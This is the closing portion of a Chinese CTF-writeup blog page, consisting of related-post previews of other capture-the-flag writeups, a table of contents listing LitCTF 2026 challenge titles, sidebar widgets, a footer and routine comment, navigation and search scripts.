onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">QingCenCTF 刷题writeup</div></div><div class="info-2"><div class="info-item-1">QingCenCTF 刷题writeuposint懒得写writeup了 网址：https://ctf.jinqiusec.studio/ 123456789101112131415做 CTF Web 题时，按一个清晰的顺序来可以少走弯路。下面是一套通用的做题流程，适合刚接触 Web 安全的同学。一、信息收集查看网页源码 — 右键查看源代码，或 F12 打开开发者工具，留意 HTML 注释、隐藏字段、JS 里的敏感信息。抓包分析 — 用 Burp Suite、Fiddler 或浏览器自带的 Network 面板，看请求头、参数、Cookie、响应内容。目录与文件 — 尝试常见路径（如 /robots.txt、/.git、/admin、/backup），必要时用目录扫描工具。二、漏洞挖掘注入类 — 根据参数类型考虑 SQL 注入、命令注入、模板注入等，先判断是否有回显/报错。文件与协议 — 文件包含、文件上传、XXE、SSRF 等，关注读文件、写文件、访问内网等能力。逻辑与权限 — 越权、条件竞争、验证码绕过、二次注入等业务逻辑问题。三、利用与拿 flag构造 payload — ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/01/03/furryCTF%E7%83%AD%E8%BA%AB%E8%B5%9Bwp/" title="furryCTF热身赛wp"><img class="cover" src="https://picsum.photos/1920/1080?random=2" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-03</div><div class="info-item-2">furryCTF热身赛wp</div></div><div class="info-2"><div class="info-item-1">furryCTF2025赛前热身题（misc方向）比赛网站：https://furryctf.com/games/5 1.签到题题目描述： 123话说，你们有发现比赛平台上藏有一个flag吗？注意flag格式哦~  在赛题主页就可以找到：   flag为： 1furryCTF&#123;Hack_for_fun_not_for_profit&#125;  2.新的一年，新的开始题目描述： 1234567891011Catch The FutureTime to own 2025Forever young in hackingfurryCTF&#123;h4ppY_n3w_y34r_2o25_w1th_1Ov3&#125;祝各位师傅：栈上生花，堆里藏月，逆向不秃，web不坐牢，pwn穿一切，ak全场！ 🚩🎉  这种就是问卷题 flag为： 1furryCTF&#123;h4ppY_n3w_y34r_2o25_w1th_1Ov3&#125;  3.PassDump123456789作为CTFer，很多时候都会有电脑放一夜跑程序的经历。但猫猫看着跑一夜碰撞之后蓝屏的电脑，陷入了沉思...</div></div></div></a><a class="pagination-related" href="/2026/01/28/XCTF-LilacCTF-2026-Writeup/" title="XCTF-LilacCTF 2026-Writeup"><img class="cover" src="https://picsum.photos/1920/1080?random=1" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-28</div><div class="info-item-2">XCTF-LilacCTF 2026-Writeup</div></div><div class="info-2"><div class="info-item-1">XCTF-LilacCTF 2026-Writeup官方题目网址：https://adworld.xctf.org.cn/match/guide?event_hash=7b528ca2-f4da-11f0-bf63-000c297261bb 这次就做出来5题(比一开始只会签到要好)，以自己的拙见写一份wp 1.MISC-Welcome签到题 题目描述： 1789c0540b10980400c5ce92442067849153bc1f278ae1031ad95b87bc8bba6c611df6925ec46076bc955f2e0056ccc773c7f03fb580c81  这是一个十六进制字符串（hex）最后肯定要转成ASCII码：这里介绍两种做法，一种是用脚本就是下面这种做法： 12345import binascii, zlibhexdata = &quot;789c0540b10980400c5ce92442067849153bc1f278ae1031ad95b87bc8bba6c611df6925ec46076bc955f2e0056ccc773c7f03fb580c8...</div></div></div></a><a class="pagination-related" href="/2026/01/05/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E8%A7%A3%E5%8E%8B%E8%84%9A%E6%9C%AC%EF%BC%88%E9%80%82%E5%90%88%E5%A5%97%E5%A8%83%E9%A2%98%EF%BC%89/" title="压缩包各种类型解压脚本（适合套娃题）"><img class="cover" src="https://picsum.photos/1920/1080?random=3" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-05</div><div class="info-item-2">压缩包各种类型解压脚本（适合套娃题）</div></div><div class="info-2"><div class="info-item-1">压缩包全解压脚本：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184import osimport shutilimport zipfileimport t...</div></div></div></a><a class="pagination-related" href="/2026/04/07/polarCTF-Writeup/" title="polarCTF Writeup"><img class="cover" src="https://picsum.photos/1920/1080?random=3" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-07</div><div class="info-item-2">polarCTF Writeup</div></div><div class="info-2"><div class="info-item-1">PolarCTF WriteupMisc麦填本题思路如下： 额，这题有点难绷其实,先在010 editor里打开图片发现在FF D9文件尾后面有一个base64和png:   Base64那个解密一下是：sevenightnine，这是最难绷的这个在flag里是789(我还傻傻的把sevenightnine当做后半段) OK把png提取出来从89 50开始，得到一张二维码，扫一下：   把这个flag和789拼一下就是flag: 1flag&#123;win789&#125;    time本题思路如下： 密文：ptdh{dqpfsajpsvjgSVgbVQIFLWXZ} key: 长度为 5\4 开机时间戳 1630416000 除了密文，其他给的信息我没看出来有啥用。 观察密文格式 ptdh{…}，与flag{}对比，将密文头部和已知的明文头部对齐，尝试计算它们在字母表中的偏移量： p(15)-f(5) &#x3D;10(k) t(19)-l(11)&#x3D;8(i) d(3)-a(0)&#x3D;3(d) h(7)-g(6)&#x3D;1(b) 由此，我们得出了维吉尼亚密...</div></div></div></a><a class="pagination-related" href="/2026/02/12/SHCTF-misc%E6%96%B9%E5%90%91%E9%98%B6%E6%AE%B5%E4%B8%80wp/" title="SHCTF misc方向阶段一wp"><img class="cover" src="https://picsum.photos/1920/1080?random=2" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-12</div><div class="info-item-2">SHCTF misc方向阶段一wp</div></div><div class="info-2"><div class="info-item-1">SHCTF WP -NinaSec这次并没有花费很多时间去做这个题目，因为要过年了嘛，事情有点多，所以就把misc做了一做，写个wp,嘿嘿~   比赛网址：https://shc.tf/（复现平台暂时没找到） Misc-签到题目描述： 12扫码关注公众号，并发送：『马』上「赢」盛世山河即可获取本题flag  扫描公众号即可获得flag. flag为： 1SHCTF&#123;WiSh1ng_y0u_@_HaPpy_NEw_Ye@r_1n_Adv@nCe!&#125;  Misc-薇薇安的美照题目描述： 1学了一天化学的Zero，决定去打打绝区零里，flag格式：SHCTF&#123;**&#125;记得flag是大写的呢  打开附件的jpg文件用010 editor打开，看看文件尾后面： 1SHCTF&#123;MV84Xzc0XzIwXzdfOTJfMTZfNV8xOF84Xzc=&#125;  很明显的一段base64 1MV84Xzc0XzIwXzdfOTJfMTZfNV8xOF84Xzc=  解密一下： 11_8_74_20_7_92_16_5_18_8_7  结合题目所...</div></div></div></a><a class="pagination-related" href="/2026/04/07/QingCenCTF%20%E5%88%B7%E9%A2%98writeup/" title="QingCenCTF 刷题writeup"><img class="cover" src="https://picsum.photos/1920/1080?random=3" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-07</div><div class="info-item-2">QingCenCTF 刷题writeup</div></div><div class="info-2"><div class="info-item-1">QingCenCTF 刷题writeuposint懒得写writeup了 网址：https://ctf.jinqiusec.studio/ 123456789101112131415做 CTF Web 题时，按一个清晰的顺序来可以少走弯路。下面是一套通用的做题流程，适合刚接触 Web 安全的同学。一、信息收集查看网页源码 — 右键查看源代码，或 F12 打开开发者工具，留意 HTML 注释、隐藏字段、JS 里的敏感信息。抓包分析 — 用 Burp Suite、Fiddler 或浏览器自带的 Network 面板，看请求头、参数、Cookie、响应内容。目录与文件 — 尝试常见路径（如 /robots.txt、/.git、/admin、/backup），必要时用目录扫描工具。二、漏洞挖掘注入类 — 根据参数类型考虑 SQL 注入、命令注入、模板注入等，先判断是否有回显/报错。文件与协议 — 文件包含、文件上传、XXE、SSRF 等，关注读文件、写文件、访问内网等能力。逻辑与权限 — 越权、条件竞争、验证码绕过、二次注入等业务逻辑问题。三、利用与拿 flag构造 payload — ...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">joke</div><div class="author-info-description">来摆烂ing</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/simple9656"><i class="fab fa-github"></i><span>click me</span></a><div class="card-info-social-icons"><a class="social-icon" href="/h" target="_blank" title=""><i></i></a><a class="social-icon" href="/t" target="_blank" title=""><i class="1"></i></a><a class="social-icon" href="/t" target="_blank" title=""><i class="2"></i></a><a class="social-icon" href="/p" target="_blank" title=""><i class="3"></i></a><a class="social-icon" href="/s" target="_blank" title=""><i class="4"></i></a><a class="social-icon" href="/:" target="_blank" title=""><i class="5"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="6"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="7"></i></a><a class="social-icon" href="/g" target="_blank" title=""><i class="8"></i></a><a class="social-icon" href="/i" target="_blank" title=""><i class="9"></i></a><a class="social-icon" href="/t" target="_blank" title=""><i class="10"></i></a><a class="social-icon" href="/h" target="_blank" title=""><i class="11"></i></a><a class="social-icon" href="/u" target="_blank" title=""><i class="12"></i></a><a class="social-icon" href="/b" target="_blank" title=""><i class="13"></i></a><a class="social-icon" href="/." target="_blank" title=""><i class="14"></i></a><a class="social-icon" href="/c" target="_blank" title=""><i class="15"></i></a><a class="social-icon" href="/o" target="_blank" title=""><i class="16"></i></a><a class="social-icon" href="/m" target="_blank" title=""><i class="17"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="18"></i></a><a class="social-icon" href="/s" target="_blank" title=""><i class="19"></i></a><a class="social-icon" href="/i" target="_blank" title=""><i class="20"></i></a><a class="social-icon" href="/m" target="_blank" title=""><i class="21"></i></a><a class="social-icon" href="/p" target="_blank" title=""><i class="22"></i></a><a class="social-icon" href="/l" target="_blank" title=""><i class="23"></i></a><a class="social-icon" href="/e" target="_blank" title=""><i class="24"></i></a><a class="social-icon" href="/9" target="_blank" title=""><i class="25"></i></a><a class="social-icon" href="/6" target="_blank" title=""><i class="26"></i></a><a class="social-icon" href="/5" target="_blank" title=""><i class="27"></i></a><a class="social-icon" href="/6" target="_blank" title=""><i class="28"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="29"></i></a><a class="social-icon" href="/%7C" target="_blank" title=""><i class="30"></i></a><a class="social-icon" href="/%7C" target="_blank" title=""><i class="31"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="32"></i></a><a class="social-icon" href="/G" target="_blank" title=""><i class="33"></i></a><a class="social-icon" href="/i" target="_blank" title=""><i class="34"></i></a><a class="social-icon" href="/t" target="_blank" title=""><i class="35"></i></a><a class="social-icon" href="/h" target="_blank" title=""><i class="36"></i></a><a class="social-icon" href="/u" target="_blank" title=""><i class="37"></i></a><a class="social-icon" href="/b" target="_blank" title=""><i class="38"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="39"></i></a><a class="social-icon" href="/%7C" target="_blank" title=""><i class="40"></i></a><a class="social-icon" href="/%7C" target="_blank" title=""><i class="41"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="42"></i></a><a class="social-icon" href="/'" target="_blank" title=""><i class="43"></i></a><a class="social-icon" href="#" target="_blank" title=""><i class="44"></i></a><a class="social-icon" href="/2" target="_blank" title=""><i class="45"></i></a><a class="social-icon" href="/4" target="_blank" title=""><i class="46"></i></a><a class="social-icon" href="/2" target="_blank" title=""><i class="47"></i></a><a class="social-icon" href="/9" target="_blank" title=""><i class="48"></i></a><a class="social-icon" href="/2" target="_blank" title=""><i class="49"></i></a><a class="social-icon" href="/e" target="_blank" title=""><i class="50"></i></a><a class="social-icon" href="/'" target="_blank" title=""><i class="51"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">你是我生命里的意外惊喜，不需要言语，却能治愈我所有的疲惫。每一次低落，都是因为你，我才重新找到力量。你是我不曾预料的温暖，直接击中心脏。你，是我的全世界。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#LitCTF-Writeup-%E2%80%93NinaSec"><span class="toc-number">1.</span> <span class="toc-text">LitCTF Writeup –NinaSec</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-lsb-base64"><span class="toc-number">1.1.1.</span> <span class="toc-text">[LitCTF2026] lit_lsb_base64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-rush-qr"><span class="toc-number">1.1.2.</span> <span class="toc-text">[LitCTF2026] lit_rush_qr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-sstv"><span class="toc-number">1.1.3.</span> <span class="toc-text">[LitCTF2026] lit_sstv</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-welcome"><span class="toc-number">1.1.4.</span> <span class="toc-text">[LitCTF2026] lit_welcome</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-pyjail-reader"><span class="toc-number">1.1.5.</span> <span class="toc-text">[LitCTF2026] lit_pyjail_reader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-pyjail-unicode"><span class="toc-number">1.1.6.</span> <span class="toc-text">[LitCTF2026] lit_pyjail_unicode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-ezsql"><span class="toc-number">1.2.1.</span> <span class="toc-text">[LitCTF2026] lit_ezsql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-Northbridge-Document-Hub"><span class="toc-number">1.2.2.</span> <span class="toc-text">[LitCTF2026] Northbridge Document Hub</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-%E5%8D%8E%E8%BE%B0%E4%BC%81%E4%B8%9A%E6%9C%8D%E5%8A%A1%E8%BF%90%E8%90%A5%E5%B9%B3%E5%8F%B0"><span class="toc-number">1.2.3.</span> <span class="toc-text">[LitCTF2026] 华辰企业服务运营平台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-ezssti"><span class="toc-number">1.2.4.</span> <span class="toc-text">[LitCTF2026] lit_ezssti</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-reverse-my-web"><span class="toc-number">1.2.5.</span> <span class="toc-text">[LitCTF2026] lit_reverse_my_web</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-xor-two-story"><span class="toc-number">1.3.1.</span> <span class="toc-text">[LitCTF2026] lit_xor_two_story</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-elgamal-handshake"><span class="toc-number">1.3.2.</span> <span class="toc-text">[LitCTF2026] lit_elgamal_handshake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-rsa-neighbor"><span class="toc-number">1.3.3.</span> <span class="toc-text">[LitCTF2026] lit_rsa_neighbor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-tiny-key-aes"><span class="toc-number">1.3.4.</span> <span class="toc-text">[LitCTF2026] lit_tiny_key_aes</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">1.4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-rc4-variant"><span class="toc-number">1.4.1.</span> <span class="toc-text">[LitCTF2026] lit_rc4_variant</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-tea-standard"><span class="toc-number">1.4.2.</span> <span class="toc-text">[LitCTF2026] lit_tea_standard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-b64-alphabet"><span class="toc-number">1.4.3.</span> <span class="toc-text">[LitCTF2026] lit_b64_alphabet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-xor-chain"><span class="toc-number">1.4.4.</span> <span class="toc-text">[LitCTF2026] lit_xor_chain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-xtea-tweak"><span class="toc-number">1.4.5.</span> <span class="toc-text">[LitCTF2026] lit_xtea_tweak</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.5.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-ret2text32"><span class="toc-number">1.5.1.</span> <span class="toc-text">[LitCTF2026] lit_ret2text32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-ret2libc"><span class="toc-number">1.5.2.</span> <span class="toc-text">[LitCTF2026] lit_ret2libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-ret2syscall32"><span class="toc-number">1.5.3.</span> <span class="toc-text">[LitCTF2026] lit_ret2syscall32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-ropchain"><span class="toc-number">1.5.4.</span> <span class="toc-text">[LitCTF2026] lit_ropchain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-integer-overflow"><span class="toc-number">1.5.5.</span> <span class="toc-text">[LitCTF2026] lit_integer_overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF2026-lit-ret2shellcode"><span class="toc-number">1.5.6.</span> <span class="toc-text">[LitCTF2026] lit_ret2shellcode</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/05/25/LitCTF-Writeup/" title="LitCTF Writeup"><img src="https://picsum.photos/1920/1080?random=1" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="LitCTF Writeup"/></a><div class="content"><a class="title" href="/2026/05/25/LitCTF-Writeup/" title="LitCTF Writeup">LitCTF Writeup</a><time datetime="2026-05-25T05:13:48.000Z" title="发表于 2026-05-25 13:13:48">2026-05-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/07/QingCenCTF%20%E5%88%B7%E9%A2%98writeup/" title="QingCenCTF 刷题writeup"><img src="https://picsum.photos/1920/1080?random=3" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="QingCenCTF 刷题writeup"/></a><div class="content"><a class="title" href="/2026/04/07/QingCenCTF%20%E5%88%B7%E9%A2%98writeup/" title="QingCenCTF 刷题writeup">QingCenCTF 刷题writeup</a><time datetime="2026-04-07T04:52:32.000Z" title="发表于 2026-04-07 12:52:32">2026-04-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/07/polarCTF-Writeup/" title="polarCTF Writeup"><img src="https://picsum.photos/1920/1080?random=3" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="polarCTF Writeup"/></a><div class="content"><a class="title" href="/2026/04/07/polarCTF-Writeup/" title="polarCTF Writeup">polarCTF Writeup</a><time datetime="2026-04-07T00:27:53.000Z" title="发表于 2026-04-07 08:27:53">2026-04-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/12/SHCTF-misc%E6%96%B9%E5%90%91%E9%98%B6%E6%AE%B5%E4%B8%80wp/" title="SHCTF misc方向阶段一wp"><img src="https://picsum.photos/1920/1080?random=2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SHCTF misc方向阶段一wp"/></a><div class="content"><a class="title" href="/2026/02/12/SHCTF-misc%E6%96%B9%E5%90%91%E9%98%B6%E6%AE%B5%E4%B8%80wp/" title="SHCTF misc方向阶段一wp">SHCTF misc方向阶段一wp</a><time datetime="2026-02-12T14:45:20.000Z" title="发表于 2026-02-12 22:45:20">2026-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/09/furryCTF-2025-WP-from-NinaSec-%E5%92%8C%E5%B7%A5%E4%B8%80%E9%98%B5%E5%B8%88%E5%82%85%E4%B8%80%E8%B5%B7%E5%81%9A%E7%9A%84nwn/" title="furryCTF 2025 WP from NinaSec(和工一阵师傅一起做的nwn)"><img src="https://picsum.photos/1920/1080?random=3" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="furryCTF 2025 WP from NinaSec(和工一阵师傅一起做的nwn)"/></a><div class="content"><a class="title" href="/2026/02/09/furryCTF-2025-WP-from-NinaSec-%E5%92%8C%E5%B7%A5%E4%B8%80%E9%98%B5%E5%B8%88%E5%82%85%E4%B8%80%E8%B5%B7%E5%81%9A%E7%9A%84nwn/" title="furryCTF 2025 WP from NinaSec(和工一阵师傅一起做的nwn)">furryCTF 2025 WP from NinaSec(和工一阵师傅一起做的nwn)</a><time datetime="2026-02-09T13:08:06.000Z" title="发表于 2026-02-09 21:08:06">2026-02-09</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By joke</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div><div class="footer_custom_text">你和我的一切有关</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://jokeblogcomments.vercel.app',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const init = (el = document, path = location.pathname) => {
+    twikoo.init({
+      el: el.querySelector('#twikoo-wrap'),
+      envId: 'https://jokeblogcomments.vercel.app',
+      region: '',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      },
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    
+
+    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
+      if (el.children.length) {
+        el.innerHTML = ''
+        el.classList.add('no-comment')
+      }
+    })
+  }
+
+  const loadTwikoo = (el, path) => {
+    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
+    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo@1.6.44/dist/twikoo.all.min.js').then(() => init(el, path))
+  }
+
+  if (isShuoshuo) {
+    'Twikoo' === 'Twikoo'
+      ? window.shuoshuoComment = { loadComment: loadTwikoo }
+      : window.loadOtherComment = loadTwikoo
+    return
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script src="/js/random_bg.js"></script><script src="/js/sakura.js"></script><script src="/js/music_card.js"></script><script src="/js/runtime.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      false
+        ? pjax.loadUrl('/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章喵...hhh你找到我了吗" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.3"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"react":{"opacity":0.9},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
